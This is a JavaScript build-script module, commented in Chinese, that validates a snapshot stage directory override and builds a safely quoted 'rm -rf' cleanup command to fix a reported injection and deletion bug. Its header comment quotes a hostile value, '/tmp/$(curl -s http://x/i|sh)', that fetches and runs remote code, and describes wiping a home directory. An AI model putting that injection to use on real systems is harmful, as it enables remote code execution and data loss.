// scripts/lib/snapshot-stage.mjs — 快照 stage 目录的覆盖值校验与清场命令构造（issue #1602）。
//
// 真因（issue #1602）：`DSH_SNAPSHOT_STAGE` 是**唯一**能把 `rm -rf` 指向任意目录的入口，而旧校验
// 只有 `override.startsWith('/')` 一条。两个后果都在开发机/构建机上兑现：
//   ① 破坏：`DSH_SNAPSHOT_STAGE=/root`（或漏写 ABI 段 `/root/.dsh-stage`）→ 清场直接删掉家目录，
//      或删掉另一个 ABI 正在跑的 stage；
//   ② 注入：`DSH_SNAPSHOT_STAGE='/tmp/$(curl -s http://x/i|sh)'` 能通过 `startsWith('/')`，
//      而清场走 `wsl()` → `sh()` → `bash -lc`，双引号里的 `$()` 由 bash 展开 ⇒ 执行。
//
// 修法两条，缺一不可：
//   ① **地板**：覆盖值必须落在 `/home|/root|/data|/mnt` 之下、必须含 `.dsh-stage` 层、
//      `.dsh-stage` 之后必须还有一段（ABI），且不得含 shell 展开字符与控制字符；
//   ② **引号**：清场命令一律用单引号（`shellQuote`），不再依赖「值里没有怪字符」这条假设。
//
// 本模块是**纯函数**：不读环境、不碰文件系统、不起子进程 —— 这样判据可以在任何机器上真跑，
// 而且 build-snapshot-013.mjs 的校验逻辑与测试跑的是同一份实现（不会各写一套后漂移）。
import { shellQuote } from './shell.mjs'

/** 允许的根：都是「有家目录/数据目录」的真实位置，排除 `/tmp`、`/usr` 这类公共目录。 */
export const STAGE_ALLOWED_ROOTS = Object.freeze(['/home', '/root', '/data', '/mnt'])

/** stage 必须有的层名（`<root>/…/.dsh-stage/<abi>`）。 */
export const STAGE_LAYER = '.dsh-stage'

/**
 * 校验 `DSH_SNAPSHOT_STAGE` 覆盖值。
 *
 * @param {unknown} value 环境变量原值。
 * @returns {string|null} 拒绝理由；null = 通过。
 */
export function stageOverrideError(value) {
  if (typeof value !== 'string' || value === '') return 'DSH_SNAPSHOT_STAGE 不能为空'
  // 控制字符（含换行）：换行会把一行命令拆成两条，是最廉价的分号替身。
  if (/[\u0000-\u001f\u007f]/.test(value)) return 'DSH_SNAPSHOT_STAGE 不得含控制字符（含换行）'
  // shell 展开字符：清场虽然已改单引号，但同文件另有若干处按既有形态拼接的 wsl() 调用；
  // 覆盖值里出现这些字符本身就说明它不是一条真实路径。
  if (/[$\x60]/.test(value)) return 'DSH_SNAPSHOT_STAGE 不得含 $ 或反引号（shell 展开字符）'
  if (!value.startsWith('/')) return 'DSH_SNAPSHOT_STAGE 必须是 Linux 绝对路径（例如 /root/.dsh-stage/x86_64）'
  if (value !== value.trim()) return 'DSH_SNAPSHOT_STAGE 首尾不得有空白'
  const segments = value.split('/').slice(1)
  if (segments.some((s) => s === '')) return 'DSH_SNAPSHOT_STAGE 含空路径段（重复斜杠或结尾斜杠）'
  if (segments.some((s) => s === '.' || s === '..')) return 'DSH_SNAPSHOT_STAGE 不得含 . 或 .. 路径段'
  const root = '/' + segments[0]
  if (!STAGE_ALLOWED_ROOTS.includes(root)) {
    return 'DSH_SNAPSHOT_STAGE 必须位于 ' + STAGE_ALLOWED_ROOTS.join(' ') + ' 之下，收到 ' + root
  }
  const layerAt = segments.indexOf(STAGE_LAYER)
  if (layerAt < 0) return 'DSH_SNAPSHOT_STAGE 必须含 ' + STAGE_LAYER + ' 层（例如 /root/' + STAGE_LAYER + '/x86_64）'
  if (layerAt === segments.length - 1) {
    return 'DSH_SNAPSHOT_STAGE 必须写到 ' + STAGE_LAYER + ' 之下的 ABI 目录（写成 ' + STAGE_LAYER
      + ' 本身会连带删掉同机另一个 ABI 正在进行的 stage）'
  }
  return null
}

/**
 * 构造「删掉 stage」的一行 shell 命令。
 *
 * 单引号是**判据**不是风格：双引号版本在路径含 `$(...)` 时会执行其中的命令；
 * `shellQuote` 之后的字符串在 bash 里是纯字面量。`--` 挡住以 `-` 开头的路径被当成旗标。
 *
 * @param {string} linuxPath Linux 侧绝对路径。
 * @returns {string}
 */
export function stageRemovalCommand(linuxPath) {
  const path = String(linuxPath)
  if (!path.startsWith('/')) throw new Error('stageRemovalCommand 只接受 Linux 绝对路径：' + path)
  return 'rm -rf -- ' + shellQuote(path)
}
